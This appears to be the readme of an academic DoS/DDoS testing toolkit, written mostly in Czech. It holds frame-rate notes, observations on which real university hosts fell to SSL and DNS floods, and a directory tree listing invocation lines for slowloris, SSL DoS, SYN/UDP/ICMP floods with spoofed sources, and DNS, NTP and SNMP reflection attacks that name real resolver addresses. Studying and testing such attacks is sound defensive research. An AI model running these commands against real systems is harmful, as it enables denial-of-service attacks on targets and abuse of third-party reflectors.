do not abuse, this repository contains pure academic research, do not abuse
mailto:abuse@cesnet.cz
mailto:bodik@cesnet.cz

DoS a DDoS utoky
------------------------

* Theoretical Ethernet Maximum Frame Rate

	The maximum frame rate is calculated using the minimum values of the following parameters, as described in the IEEE 802.3ae standard:
	Preamble: 8 bytes * 8 = 64 bits
	Frame length (minimum): 64 bytes * 8 = 512 bits
	Inter-frame gap (minimum): 12 bytes * 8 = 96 bits 
	Maximum Frame Rate = MAC Transmit Bit Rate / (Preamble + Frame Length + Inter-frame Gap)
	
	Ethernet Maximum Frame Rate Ethernet 	Rate [fps]
	10 Gigabit Ethernet 	14 880 952.38
	Gigabit Ethernet 	1 488 095.24
	Fast Ethernet 	148 809.53
	Ethernet 	14 880.95

	10GBASE-R operates at 10.3125 Gb/s line rate
	10GBASE-W operates at 9.95328 Gb/s line rate 


* virtualizace sebere cca 10-20% sitroveho vykonu
 (generovani paketu v dom0 vs. domU)

* pcap sledovani na generatoru bere vice nez 50% vykonu

* clustery META pred sebou nemaji ochranu URPF
  uz je opraveno

* tcp-syn.sh smerem na portal4 zpusobi ze se sitovy switch 
  zacne na chvili chovat v klidu jako hub i presto ze si vubec nehraju s L2

* floodovani pres DNS server je hezka vec, ale na zcu mame conntrack ktery se po urcite chvili hrouti
  (zahazuje prichozi pakety) a na cesnetu maji bud to same nebo nejaky lepsi filtr. na decsys.vsb funguje
  dnssecq flood lip nez jinde, bud neni conntrack nebo neni filtr

* pomoci thc-ssl-dos jde zahltit apache ktery ma velky pool, pokud je pool maly (napr. rt.zcu.cz=max 20) tak se
  s timto utokem vyporada dobre. sundat jde napr www.zcu.cz nebo portal.zcu.cz kteri maji velky conn. pool

* pri spoofovani ipcek je potreba byt opatrny, nektere site jsou v pohode, nektere jenom dropnou traffic, 
  moje domaci APcko mne na chvili odrizne

* pri webovych utocich je potreba ptat se na neco co nedava 302...

* cisco 
  show process cpu
  show process cpu history







TODO:
* dig +trace @147.228.44.13
bounce alespon rootserveru, server vracel na jakykoliv dotaz zbytecne additional records. pomer 77:720

* caletka
 vydosovani autoritativniho nameserveru, zpusobi pretekani cache/poctu soucasne umoznovanych 
 rekurzivnich dotazu na "klientskych" rekurzivnich serverech







url

* https://support.zcu.cz/index.php/U%C5%BEivatel:Smrha/QoS/MaxEthernetRate
* https://gmon.zcu.cz/torrus/cesnet?nodeid=if//r99-pm.cesnet.cz//TenGigabitEthernet1/2//inpackets
* http://wiki.networksecuritytoolkit.org/nstwiki/index.php/LAN_Ethernet_Maximum_Rates,_Generation,_Capturing_%26_Monitoring
* http://www.cisco.com/web/about/security/intelligence/unicast-rpf.html
* pub.netsniff-ng.org
* http://www.ibm.com/developerworks/library/l-gnuplot/
* http://www.sans.org/security-resources/malwarefaq/stacheldraht.php
* http://www.princeton.edu/~rblee/ELE572Papers/p514-kargl.pdf
* http://digital.net/~gandalf/Rose_Frag_Attack_Explained.txt




taxonomie ddos-cz.mm

.
|-- ddos-cz.mm							mind mapa
|-- docs							dokumenty ze kterych jsem cerpal
|-- thc								summodul pro nastroje thc.org
|-- wires
|   |-- gwires.sh						graficke mereni tcp flagu
|-- nc								netcat, pv a jednoduche testovaci skripty
|-- nmap						        nmap	
|-- p								orchestrator
|-- readme.txt


|-- http
|   |-- golden.sh						utok http keep-alive 
	golden.sh -u"http://targeturl/testovaci.php" -mget|post|random|head -T2

|   |-- slow.sh							utok http slowheaders/slowloris, slowpost
	slow.sh -htargethost -p80 -P "/testovaci.php" -A|-B|-C|-D -T2 (headers,headerspost,post,postrandpayload)

|   |-- ssldos.sh						utok thc ssl dos
	ssldos.sh -htarget -p443 -T2

|-- misc
|   |-- dnssmurf.sh						utok dns reflection
	dnssmurf.sh -starget -d147.228.3.3 -t any -q"jj-cat4900-gw.zcu.cz" -T2
	dnssmurf.sh -starget -d158.196.149.9 -t any -q"rs.cesnet.cz" -T2

	echo "158.196.149.9 rs.cesnet.cz\n147.228.3.3 jj-cat4900-gw.zcu.cz" > a
	dnssmurf.sh -starget -f a -t any -T2

|   |-- grabsysinfo.sh						helper, deprecated
|   |-- netinfo.sh						ziskani nastaveni site
|   |-- netpps.sh						mereni pps
|   |-- netspeed.sh						mereni kbps

|-- tg								trafgen
|   |-- check_host_port.sh					sonda pro mereni dostupnost
|   |-- gifpps.sh						graficke mereni sitove aktivity
|   |-- ifpps.sh						ifpps wrapper
|   |-- lib-i686						sdilene knihovny
|   |-- lib-x86_64						sdilene knihovny
|   |-- lib.sh							knihovna pro tg
|   |-- run.sh							run wrapper pro rga

|   |-- icmp-echo.sh						utok icmp echo
	 icmp-echo.sh -sZ -dtarget -DP

|   |-- icmp-ttl-exp.sh						utok icmp ttl expire (tcp-syn s kratkym ttl)
	icmp-ttl-exp.sh -starget -d"147,drnd(3)" -S"rnd(2)" -D"c16(443)" -t3 -n100000 -T2
	udp-random.sh -starget -d"147,drnd(3)" -S"rnd(2)" -l0 -t3 -n100000 -T2
	tcp-ack.sh -starget -d"147,drnd(3)" -D"rnd(2)" -t3 -n100000 -T2

|   |-- tcp-ack.sh						utok tcp-ack flood
	tcp-ack.sh -sZ -dtarget -D"rnd(2)" -n100000 -T2

|   |-- tcp-randh.sh					  	utok tcp random header (bubonic) flood
	tcp-randh.sh -sZ -dtarget -n100000 -T2

|   |-- tcp-syn.sh						utok tcp-syn flood, tcp reflected syn-ack, icmp ttl expire, land attack
	tcp-syn.sh -sZ -dtarget -n100000 -T2 
	tcp-syn.sh -starget -d147.228.121.23 -S"c16(443)" -D"rnd(2)" -n100000 -T2
	tcp-syn.sh -starget -d"147,drnd(3)" -S"rnd(2)" -D"rnd(2)" -t3 -n100000 -T2
	tcp-syn.sh -starget -dtarget -S"drnd(2)" -D"c16(443)" -n100000 -T2

|   |-- tcp-synack.sh						utok tcp-synack flood, simulace odrazeni
	tcp-synack.sh -sZ -dtarget -S"c16(443)" -D"drnd(2)" -n100000 -T2

|   |-- udp-dnsq.sh						utok dns query reflection (ANY jj-cat4900-gw.zcu.cz)
	udp-dnsq.sh -starget -r"reflector1 reflector2" -n100000 -T2

|   |-- udp-dnssecq.sh						utok dnssec query reflection (ANY rs.cesnet.cz)
	udp-dnsq.sh -starget -r"reflector1 reflector2" -n100000 -T2
	
|   |-- udp-frag-attack.sh
        http://pub.netsniff-ng.org/examples/trafgen/frag_packet03_small_frag.txf
	http://article.gmane.org/gmane.linux.network/256683	

|   |-- udp-maxsize.sh
	udp-maxsize.sh -sZ -dtarget -l1399 -n100000 -T2

|   |-- udp-ntpmon.sh
	udp-ntpmon.sh -sX -r reflektor -n5 -T2

|   |-- udp-ntprv.sh
	udp-ntprv.sh -sX -r reflektor -n5 -T2
	
|   |-- udp-random.sh
	udp-random.sh -sZ -dtarget -l0 -n100000 -T2 (zero payload)
	udp-random.sh -sZ -dtarget -l10 -n100000 -T2 (random payload drnd)

|   |-- udp-snmp-getbulk.sh
	udp-snmp-getbulk.sh -starget -r"reflecto1 reflector2" -n100000 -T2 (static query for large response)

|   |-- udp-snmp-nmapget.sh
	udp-snmp-nmapget.sh -starget -r"reflecto1 reflector2" -n100000 -T2 (nmap default -sU -pU:161 get)


by default all tg commands will resolve first interface with default gateway and will use just one cpu
optionaly output interface can be specified with -o and nums of cpu with -c, which can be used in
environment with multiple nics to gain more output
